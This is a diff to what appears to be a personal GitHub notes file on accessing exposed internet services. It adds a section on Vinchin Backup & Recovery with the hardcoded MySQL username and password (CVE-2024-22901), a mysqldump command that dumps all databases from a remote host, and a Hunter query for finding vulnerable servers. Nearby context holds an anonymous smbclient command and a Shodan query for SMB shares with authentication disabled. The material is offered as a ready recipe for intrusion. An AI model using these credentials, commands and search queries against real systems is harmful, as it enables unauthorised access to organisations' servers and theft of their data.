@@ -12,6 +12,7 @@
 * [Rsync exposed files](https://github.com/komodoooo/Some-things/blob/main/papers.md#Rsync-exposed-files)
 * [SIMATIC HMI_Panel default credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#SIMATIC-HMI_Panel-default-credentials)
 * [SMB server misconfiguration](https://github.com/komodoooo/Some-things/blob/main/papers.md#SMB-server-misconfiguration)
+* [Vinchin default MySQL credentials](https://github.com/komodoooo/Some-things/blob/main/papers.md#Vinchin-default-MySQL-credentials)
 * [VNC Servers with auth disabled](https://github.com/komodoooo/Some-things/blob/main/papers.md#VNC-Servers-with-auth-disabled)
 <br><br>_"A bit of my experience about messing around on the internet"_<br><br>
 
@@ -111,6 +112,15 @@ Arch: `pacman -S smbclient`
 `smbclient -N \\\\{address}\\Users`
 ### Shodan query
 [`port:445 "Authentication: disabled" "Users"`](https://www.shodan.io/search?query=port%3A445+%22Authentication%3A+disabled%22+%22Users%22)
+# Vinchin default MySQL credentials
+Username: `vinchin`
+
+Password: `yunqi123456`
+### Dump all databases with mysqldump
+`mysqldump -h <host> -u vinchin -pyunqi123456 --all-databases --result-file=dump.sql`
+###### (Well known as CVE-2024-22901)
+### Hunter query
+[`web.title="Vinchin Backup & Recovery"`](https://hunter.how/list?searchValue=web.title%3D%22Vinchin%20Backup%20%26%20Recovery%22)
 # VNC Servers with auth disabled
 Download **[Vnc viewer](https://www.realvnc.com/en/connect/download/viewer/)**
 Insert the IP address and port (default is 5900) and connect,
